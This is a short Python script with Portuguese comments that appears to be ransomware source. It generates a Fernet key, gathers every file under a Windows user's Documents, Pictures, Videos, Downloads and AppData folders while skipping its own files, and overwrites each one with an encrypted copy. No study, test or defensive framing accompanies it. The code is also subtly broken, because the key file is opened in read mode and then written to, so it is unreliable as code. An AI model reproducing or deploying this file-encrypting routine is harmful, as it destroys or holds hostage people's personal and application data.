import os
from cryptography.fernet import Fernet

# criar a chave para criptografar e decriptografar
key = Fernet.generate_key()
with open("chave.key", "rb") as chave:
    chave.write(key)

# Pega o nome do usuário do Windows
username = os.getenv("USERNAME")

# Lista de pastas do usuário
folders = [
    os.path.join("C:\\Users", username, "Documents"),
    os.path.join("C:\\Users", username, "Pictures"),
    os.path.join("C:\\Users", username, "Videos"),
    os.path.join("C:\\Users", username, "Downloads"),
    os.path.join("C:\\Users", username, "AppData", "Local"),
    os.path.join("C:\\Users", username, "AppData", "Roaming")
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:

            if file in ["alfredo.py", "chave.key","maicondouglas.py", "desktop.ini"]:
                continue

            file_path = os.path.join(root, file)
            arquivos.append(file_path)

# criptografar os arquivos
for arquivos in arquivos:
    with open(arquivos, "rb") as file:
        conteudo = file.read()

    conteudo_criptografado = Fernet(key).encrypt(conteudo)

    with open(arquivos, "wb") as file:
        file.write(conteudo_criptografado)
